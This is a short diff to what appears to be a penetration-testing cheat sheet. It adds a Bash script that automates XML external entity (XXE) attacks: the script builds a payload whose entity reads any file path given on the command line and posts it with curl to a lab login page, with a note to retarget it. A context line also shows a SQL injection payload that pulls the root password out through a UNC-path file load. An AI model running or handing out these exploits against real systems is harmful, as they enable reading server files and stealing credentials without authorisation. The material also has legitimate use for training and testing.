@@ -329,3 +329,35 @@ SELECT LOAD_FILE(CONCAT('\\\\', 'SELECT password FROM mysql.users WHERE user=\'r
       <password>BBBB</password>
     </login>
 ```
+
+**Bash script for XXE automation**
+
+Remember to adjust it for the correct target
+```
+#!/bin/bash
+
+if [ $# -ne 1 ]; then
+        echo "Usage $0 <file_path_to_read>"
+        exit
+fi
+
+XML="<?xml version='1.0'?>
+<!DOCTYPE xxe [
+   <!ENTITY xxe SYSTEM '$1' >
+]>
+<login>
+   <username>XXEME &xxe;</username>
+   <password>password</password>
+</login>"
+
+echo -e "==========================================="
+echo -e "\t\tSTART"
+echo -e "\nExploiting the XXE using the following XML:"
+echo $XML | xmllint --nowarning  --format -
+
+echo -e "\n\nResults: ";
+curl -s 'http://1.xxe.labs/login.php' --data "$XML" --header "Authxxe:login"
+
+echo -e "\n\n\t\tEND";
+echo -e "===========================================";
+```
